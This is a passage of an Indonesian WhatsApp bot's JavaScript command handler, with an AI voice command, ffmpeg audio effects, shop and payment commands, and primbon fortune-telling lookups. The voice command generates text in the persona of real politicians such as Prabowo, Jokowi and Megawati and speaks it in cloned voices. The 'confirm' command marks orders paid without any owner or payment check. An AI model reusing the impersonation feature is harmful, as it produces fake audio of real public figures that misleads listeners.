        return reply(`*Format salah!*\nGunakan format: ${XyrooRynzz} voice,teks\n\n*Contoh:* ${XyrooRynzz} prabowo,Halo Pak`);
    }

    const voices = [
        'adam',
        'prabowo',
        'thomas_shelby',
        'jokowi',
        'megawati',
    ];

    if (!voices.includes(voice.toLowerCase())) {
        return reply(`*Suara tidak ditemukan!*\nDaftar suara yang tersedia:\n- ${voices.join('\n- ')}\n\nGunakan format: ${XyrooRynzz} <voice>,<teks>`);
    }

    let prompt = '';
    if (['prabowo', 'adam', 'thomas_shelby', 'jokowi', 'megawati'].includes(voice.toLowerCase())) {
        prompt = `Nama kamu adalah ${voice}, kamu adalah seorang pria yang tegas dan penuh wibawa. Berbicara dengan nada yang serius, penuh keyakinan, dan memiliki karisma yang kuat. Semua ucapanmu harus terdengar berwibawa dan penuh makna, tidak pernah ragu dalam berbicara. Tanggapi pesan berikut dengan tegas dan penuh kepercayaan diri: "${message}"`;
    }

    const requestData = { content: message, user: m.sender, prompt: prompt };

    try {
        const response = await axios.post('https://luminai.my.id', requestData);
        const generatedText = response.data.result;

        const ttsUrl = `https://aihub.xtermai.xyz/api/text2speech/elevenlabs?text=${encodeURIComponent(generatedText)}&key=${apii.xterm.key}&voice=${voice}`;
        const audioResponse = await fetch(ttsUrl);

        if (!audioResponse.ok) throw new Error('Gagal mengambil audio TTS');
        const audioBuffer = await audioResponse.arrayBuffer();

        Alice.sendMessage(m.chat, { audio: Buffer.from(audioBuffer), mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
    } catch (err) {
        console.error('Terjadi kesalahan:', err);
        reply('Terjadi kesalahan saat memproses permintaan Anda.');
    }
}
break

case 'bass': 
  case 'blown': 
    case 'deep': 
      case 'earrape': 
      case 'fast': 
      case 'fat': 
      case 'nightcore': 
      case 'reverse': 
      case 'robot': 
      case 'slow': 
      case 'smooth': 
      case 'tupai': {
if (isBan) return XRB()
await XReaction()
          if (!/audio/.test(mime)) return reply(`reply audio, dengan caption *${XyrooRynzz}*`);
          let set;
          if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';      
          if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';       
          if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';     
          if (/earrape/.test(command)) set = '-af volume=12';      
          if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';      
          if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';     
          if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';        
          if (/reverse/.test(command)) set = '-filter_complex "areverse"';      
          if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';   
          if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'; 
          if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';    
          if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
          if (/audio/.test(mime)) {
              let media = await Alice.downloadAndSaveMediaMessage(quoted);
              await reaction(m.chat, "⚡")
              let ran = getRandomFile('.mp3');
              exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply(err);
                  let buff = fs.readFileSync(ran);        
                  sendMusic(buff);
                  fs.unlinkSync(ran);
              });
          }
      }
      break;


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Audio Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Store Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'tambah':{
if (isBan) return XRB()
await XReaction()
if (!text.includes('+')) return reply(` *Contoh : 10.000 + 20.000*`)

arg = args.join(' ')

xtambah1 = arg.split('+')[0]

xtambah2 = arg.split('+')[1]

var xtambah_1 = Number(xtambah1)

var xtambah_2 = Number(xtambah2)

reply(` *Hasil :* ${xtambah_1 + xtambah_2}`)}

break        
        
case 'kurang':{
if (isBan) return XRB()
await XReaction()
if (!text.includes('-')) return reply(` *Contoh : 20 - 10*`)

arg = args.join(' ')

xtambah1 = arg.split('-')[0]

xtambah2 = arg.split('-')[1]

var xtambah_1 = Number(xtambah1)

var xtambah_2 = Number(xtambah2)

reply(` *Hasil :* ${xtambah_1 - xtambah_2}`)}

break        
        
 case 'kali':{
if (isBan) return XRB()
await XReaction()
if (!text.includes('x')) return reply(` *Contoh : 5 x 10*`)

arg = args.join(' ')

xtambah1 = arg.split('x')[0]

xtambah2 = arg.split('x')[1]

var xtambah_1 = Number(xtambah1)

var xtambah_2 = Number(xtambah2)

reply(` *Hasil :* ${xtambah_1 * xtambah_2}`)}

break       
  
case 'bagi':{
if (isBan) return XRB()
await XReaction()
if (!text.includes(':')) return reply(` *Contoh : 10 : 2*`)

arg = args.join(' ')

xtambah1 = arg.split(':')[0]

xtambah2 = arg.split(':')[1]

var xtambah_1 = Number(xtambah1)

var xtambah_2 = Number(xtambah2)

reply(` *Hasil :* ${xtambah_1 / xtambah_2}`)}

break

case 'done': {
if (isBan) return Xban()
await XReaction()
                    if (!isOwner) return Xowner()
                    let t = text.split(',');
                    if (t.length < 2) return reply(`*Format salah!\nPenggunaan:\n${XyrooRynzz} barang,jumlah,nominal\nExampel ${XyrooRynzz} panel,1,10000`);
                    const owned = `${global.owner}@s.whatsapp.net`
                    let barang = t[0];
                    let jumlah = t[1];
                    let nominal = t[2];
                    let don = (`
*TRANSAKSI BERHASIL*🏵️

📆 _*Date* : ${hariini}_
✨ _*Status* : Berhasil_

_• *Barang:* ${barang}_
_• *Jumlah:* ${jumlah}_
_• *Nominal:* Rp${nominal}_

Terima kasih telah order dan mempercayai 
Store Kami
Jangan lupa order lagi ya !!
`)
reply(don)
                }
                    break 
 
case "tunda": {
if (isBan) return Xban()
await XReaction()
                    if (!isOwner) return Xowner()
                let users = m.mentionedJid[0] ? m.mentionedJid[0]: m.quoted ? m.quoted.sender: text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const owned = `${global.owner}@s.whatsapp.net`
                    const text12 = `
*TRANSAKSI PENDING*🎗️

📆 _*Date* : ${hariini}_
✨ _*Status* : Pending_

Transaksi kamu masih dipending nih
Tunggu konfirmasi selanjutnya ya 
`
            reply(text12)
                }
                    break                                       
  
case "proses": {
if (isBan) return Xban()
await XReaction()
                    if (!isOwner) return Xowner()
                let users = m.mentionedJid[0] ? m.mentionedJid[0]: m.quoted ? m.quoted.sender: text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

                    const text12 = `
*TRANSAKSI DIPROSES*🎖️

📆 _*Date* : ${hariini}_
✨ _*Status* :  Proses_

Sekarang transaksi kamu sedang
diproses nihh
Mohon tunggu sebentar ya
`
            reply(text12)
                }
                    break        
                    
case "batal": {
if (isBan) return Xban()
await XReaction()
                if (!isOwner) return Xowner()
                    let users = m.mentionedJid[0] ? m.mentionedJid[0]: m.quoted ? m.quoted.sender: text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const text12 = `
*TRANSAKSI DIBATALKAN*🚫

📆 _*Date* : ${hariini}_
✨ _*Status* : Batal_

Transaksi kamu dibatalkan`
            reply(text12)
                }
                    break                     
 
                
case 'addproduk': {
if (isBan) return XRB()
await XReaction()
if (!text.includes(',')) return reply(`Contoh: ${XyrooRynzz} nama_produk, harga, stok`)
const [productName, price, stock] = args.join(' ').split(',').map(item => item.trim())
const harga = parseInt(price, 10)
const jumlahStok = parseInt(stock, 10)
if (!productName || isNaN(harga) || isNaN(jumlahStok)) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga, dan jumlah stok.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
reply(`Produk dengan nama "${productName}" sudah ada.`)
} else {
addprodukzz(productName, harga, jumlahStok)
reply(`Produk "${productName}" telah ditambahkan dengan harga ${toRupiah(harga)} dan stok sebanyak ${jumlahStok} unit.`)
}}}
break

case 'delproduk': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh: ${XyrooRynzz} nama_produk`)
const productName = text.trim()
if (!productName) {
reply('Nama produk tidak valid.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
delprodukzz(productName)
reply(`Produk "${productName}" telah dihapus.`)
} else {
reply(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'updateproduk': {
if (isBan) return XRB()
await XReaction()
if (!text.includes(',')) return reply(`Contoh: ${XyrooRynzz} nama_produk, harga, stok`)
const [productName, price, stock] = args.join(' ').split(',').map(item => item.trim())
const harga = parseInt(price, 10)
const jumlahStok = parseInt(stock, 10)
if (!productName || isNaN(harga) || isNaN(jumlahStok)) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga, dan jumlah stok.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
updprodukzz(productName, harga, jumlahStok)
reply(`Produk "${productName}" telah diperbarui dengan harga ${toRupiah(harga)} dan stok sebanyak ${jumlahStok} unit.`)
} else {
reply(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'listproduk': {
if (isBan) return XRB()
await XReaction()
const products = getprodukdb()
const discounts = getDisczz()
if (products.length === 0) {
reply('Tidak ada produk yang tersedia saat ini.')
} else {
let listText = `List produk yg tersedia:\nTotal: ${products.length}\n\n`
products.forEach(product => {
const discount = discounts.find(d => d.produk.toLowerCase() === product.nama.toLowerCase())
if (discount) {
const discountPercentage = persenDiskonnya(product.harga, discount.harga_diskon)
listText += `• ${product.nama}\n  Harga: ~Rp${toRupiah(product.harga)}~ > Rp${toRupiah(discount.harga_diskon)} (${discountPercentage}%)\n  Stok: ${product.stok} unit\n\n`
} else {
listText += `• ${product.nama}\n  Harga: Rp${toRupiah(product.harga)}\n  Stok: ${product.stok} unit\n\n`
}})
reply(listText)
}}
break
case 'donate':
case 'payment': {
if (isBan) return XRB()
await XReaction()
await Alice.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
const url = "https://telegra.ph/file/081328443f30bb67e47c2.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: { url }
  }, {
    upload: Alice.waUploadToServer
  })
  return imageMessage
}
    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: `ini list payment ${ownername} yaa` },
              carouselMessage: {
                cards: [
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: `${danajpg}` } }, { upload: Alice.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    body: { text: `> CLICK BUTTON DANA DIBAWAH\n> DANA A/N : ${ownername}`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"ᴘᴀʏʏᴍᴇɴᴛ ᴅᴀɴᴀ\",\"id\":\"123456789\",\"copy_code\":\"${dana}\"}`
              },
                      ],
                    },
                  },
                  {                   
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: `${qrisjpg}` } }, { upload: Alice.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    body: { text: `> SCAN DI ATAS/CLICK BUTTON`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"ᴘᴀʏʏᴍᴇɴᴛ ǫʀɪs\",\"url\":\"${qris}\",\"merchant_url\":\"https://www.google.com\"}`
              },
                      ],
                    },
                  },                                    
                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      { quoted: m}
    );
    await Alice.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break          

case 'diskon': {
if (isBan) return XRB()
await XReaction()
if (!text.includes(',')) return reply(`Contoh: ${XyrooRynzz} nama_produk, harga_diskon, tgl-bln-th`)
const [productName, discountPriceStr, expirationDate] = args.join(' ').split(',').map(item => item.trim())
const discountPrice = parseInt(discountPriceStr, 10)
if (!productName || isNaN(discountPrice) || !expirationDate) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga diskon, dan tanggal kadaluarsa yang valid.')
} else {
const products = getprodukDariFile()
const product = products.find(p => p.nama.toLowerCase() === productName.toLowerCase())
if (!product) {
reply(`Produk "${productName}" tidak ditemukan.`)
} else {
addDisczz(productName, discountPrice, expirationDate)
const discountPercentage = persenDiskonnya(product.harga, discountPrice)
reply(`Diskon untuk produk "${productName}" berhasil ditambahkan.\nHarga diskon: Rp${discountPrice}, Berlaku hingga: ${expirationDate} (${discountPercentage}%)`)
}}}
break

case 'restok': {
if (isBan) return XRB()
await XReaction()
if (!text.includes(',')) return reply(`Contoh: ${XyrooRynzz} nama_produk, jumlah_stok`)
const [productName, stockStr] = args.join(' ').split(',').map(item => item.trim())
const jumlahStok = parseInt(stockStr, 10)
if (!productName || isNaN(jumlahStok) || jumlahStok <= 0) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk dan jumlah stok yang valid.')
} else {
const restockedProduct = ngerestokk(productName, jumlahStok)
if (restockedProduct) {
reply(`Stok produk "${restockedProduct.nama}" telah ditambahkan. Stok saat ini: ${restockedProduct.stok} unit.`)
} else {
reply(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'beliproduk': {
if (isBan) return XRB()
await XReaction()
if (!text.includes(',')) return reply(`Contoh: ${XyrooRynzz} nama_produk, jumlah`)
const [productName, quantity] = args.join(' ').split(',').map(item => item.trim())
const jumlah = parseInt(quantity, 10)
if (!productName || isNaN(jumlah) || jumlah <= 0) {
return reply('Format tidak valid. Pastikan untuk memasukkan nama produk dan jumlah yang valid.')
}
const products = getprodukDariFile();
const product = products.find(p => p.nama.toLowerCase() === productName.toLowerCase())

if (!product) {
return reply(`Produk "${productName}" tidak ditemukan.`)}
if (product.stok < jumlah) {
return reply(`Stok untuk produk "${productName}" tidak mencukupi. Tersisa ${product.stok} unit.`)}
const discounts = getDisczz()
const discount = discounts.find(d => d.produk.toLowerCase() === product.nama.toLowerCase())
const totalHarga = discount ? discount.harga_diskon * jumlah : product.harga * jumlah
const transactionId = cIdTrnya()
reply(`
Kamu membeli ${jumlah} produk "${productName}"
Total harga: ${toRupiah(totalHarga)}

Silahkan transfer terlebih dahulu lalu
ketik ${Xyroo}payment untuk melihat metode pembayaran yang tersedia

Ketik ini...
${Xyroo}confirm ${transactionId}
${Xyroo}cancel ${transactionId}
`)
saveTrnye({
id: transactionId,
productName,
jumlah,
totalHarga,
status: 'process',
buyer: m.sender
})
product.stok -= jumlah
simpenProduknya(products)
}
break

case 'confirm': {
if (isBan) return XRB()
await XReaction()
const transactionId = text.trim().split(' ')[0]
if (!transactionId) return reply(`Contoh: ${XyrooRynzz} id_transaksi`)
const transaction = getTrId(transactionId)
if (!transaction) {
return reply(`Transaksi dengan ID "${transactionId}" tidak ditemukan.`)
 }
if (transaction.status !== 'process') {
return reply('ID transaksi tidak valid atau tidak dalam status menunggu bukti transfer.')
}
transaction.status = 'success'
simpenSmTr(getSmTr().map(t => t.id === transactionId ? transaction : t))
reply(`Transaksi dengan ID "${transactionId}" telah berhasil dikonfirmasi.`)
}
break

case 'kensel': {
if (isBan) return XRB()
await XReaction()
const transactionId = text.trim().split(' ')[0]
if (!transactionId) return reply(`Contoh: ${XyrooRynzz} id_transaksi`)
const transaction = getTrId(transactionId)
if (!transaction) {
return reply(`Transaksi dengan ID "${transactionId}" tidak ditemukan`)
}
if (transaction.status !== 'process') {
return reply('ID transaksi tidak valid atau tidak dalam status menunggu bukti transfer')
}

const products = getprodukDariFile()
const product = products.find(p => p.nama.toLowerCase() === transaction.productName.toLowerCase())
if (product) {
product.stok += transaction.jumlah
simpenProduknya(products)
}
transaction.status = 'canceled'
simpenSmTr(getSmTr().map(t => t.id === transactionId ? transaction : t))
reply(`Transaksi dengan ID "${transactionId}" telah dibatalkan`)
}
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Store Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Primbon Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'cekumur': {
if (isBan) return XRB()
await XReaction()
            if (!q) return reply('⚠️ Masukkan tanggal lahir dengan format: *YYYY-MM-DD*');

            const isValidFormat = /^\d{4}-\d{2}-\d{2}$/.test(q);
            if (!isValidFormat) {
                return reply('❌ Format tanggal salah!\nGunakan format: *YYYY-MM-DD*\nContoh: *2002-05-27*');
            }

            const tanggalLahir = new Date(q);
            if (isNaN(tanggalLahir.getTime())) {
                return reply('❌ Tanggal tidak valid. Pastikan kamu memasukkan tanggal lahir yang benar.');
            }

            const sekarang = new Date();

            let tahun = sekarang.getFullYear() - tanggalLahir.getFullYear();
            let bulan = sekarang.getMonth() - tanggalLahir.getMonth();
            let hari = sekarang.getDate() - tanggalLahir.getDate();

            if (hari < 0) {
                bulan--;
                const bulanSebelumnya = new Date(sekarang.getFullYear(), sekarang.getMonth(), 0).getDate();
                hari += bulanSebelumnya;
            }

            if (bulan < 0) {
                tahun--;
                bulan += 12;
            }

            let selisihMs = sekarang - tanggalLahir;

            const msPerDetik = 1000;
            const msPerMenit = msPerDetik * 60;
            const msPerJam = msPerMenit * 60;
            const msPerHari = msPerJam * 24;
            const msPerTahun = msPerHari * 365.25;

            const totalTahun = Math.floor(selisihMs / msPerTahun);
            selisihMs %= msPerTahun;

            const totalHari = Math.floor(selisihMs / msPerHari);
            selisihMs %= msPerHari;

            const totalJam = Math.floor(selisihMs / msPerJam);
            selisihMs %= msPerJam;

            const totalMenit = Math.floor(selisihMs / msPerMenit);
            selisihMs %= msPerMenit;

            const totalDetik = Math.floor(selisihMs / msPerDetik);

            const isUlangTahun = sekarang.getDate() === tanggalLahir.getDate() &&
                sekarang.getMonth() === tanggalLahir.getMonth();

            const ucapanUlangTahun = isUlangTahun ?
                '\n🎉 *Selamat ulang tahun!* Semoga panjang umur, sehat selalu, dan tercapai segala cita-cita! 🎂' :
                '';

            await reply(
                `📅 Umur kamu saat ini:\n` +
                `*${tahun} tahun, ${bulan} bulan, ${hari} hari*\n\n` +
                `⏳ Total waktu hidup:\n` +
                `*${totalTahun} tahun, ${totalHari} hari, ${totalJam} jam, ${totalMenit} menit, ${totalDetik} detik*` +
                `${ucapanUlangTahun}`, {
                    quoted: m
                }
            );
        }
        break
case 'nomerhoki': case 'nomorhoki': {
if (isBan) return XRB()
await XReaction()
if (!Number(text)) return reply(`Contoh : ${XyrooRynzz} 6288292024190`)
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return reply(anu.message)
reply(`• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
Alice.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
}
break
case 'sifatusaha': {
if (isBan) return XRB()
await XReaction()
if (!text)return reply(`Contoh : ${XyrooRynzz} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
}
break
case 'rejeki': case 'rezeki': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'pekerjaan': case 'kerja': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
}
break
case 'potensipenyakit': case 'penyakit': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artitarot': case 'tarot': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Alice.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'fengshui': {
if (isBan) return XRB()
await XReaction()
if (!text) return `Contoh : ${XyrooRynzz} Dika, 1, 2005\n\nNote : ${XyrooRynzz} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case 'haribaik': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harisangar': case 'taliwangke': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
